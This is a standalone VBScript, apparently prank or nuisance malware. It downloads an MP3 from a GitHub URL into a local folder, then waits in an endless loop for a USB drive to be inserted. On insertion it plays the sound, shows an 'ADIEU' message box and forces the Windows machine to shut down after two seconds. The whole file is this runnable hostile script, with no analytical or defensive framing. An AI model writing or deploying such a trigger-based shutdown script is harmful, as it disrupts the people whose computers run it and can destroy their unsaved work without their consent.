Option Explicit
Sub HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
        WScript.Echo "ERROR: Target folder not found."
        Exit Sub
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Sub


HTTPDownload "https://github.com/Adsdworld/Python-git/raw/main/son.mp3", "C:\adelete\"


Dim objFSO, objSink, objWMI, scriptBaseName, hostName
hostName = "."
On Error Resume Next
   Set objFSO     = CreateObject("Scripting.FileSystemObject")
   Set objSink    = WScript.CreateObject("WbemScripting.SWbemSink", "Sink_")
   Set objWMI     = GetObject("winmgmts:\\" & hostName & "\root\cimv2")
   scriptBaseName = objFSO.GetBaseName(Wscript.ScriptFullName)
   If Err.Number <> 0 Then
      Wscript.Quit
   End If
   objWMI.ExecNotificationQueryAsync objSink, "Select * From __InstanceCreationEvent Within 1 Where " & _
                                              "TargetInstance Isa 'Win32_DiskDrive' And TargetInstance.InterfaceType = 'USB'"
On Error Goto 0
Do
   WScript.Sleep 1
Loop
Sub Sink_OnObjectReady(objEvent, objContext)
   Dim oPlayer
   Set oPlayer = CreateObject("WMPlayer.OCX")
   ' Play audio
   oPlayer.URL = "C:\adelete\son.mp3"
   oPlayer.controls.play 
   While oPlayer.playState <> 1 ' 1 = Stopped
     WScript.Sleep 100
   Wend
   ' Release the audio file
   oPlayer.close
   Dim objShell
   Set objShell = WScript.CreateObject("WScript.Shell")
   MsgBox("\: ADIEU :/")
   objShell.Run "C:\WINDOWS\system32\shutdown.exe -s -t 2"

   On Error Resume Next
      If Err.Number <> 0 Then
         Exit Sub
      End If
   On Error Goto 0
End Sub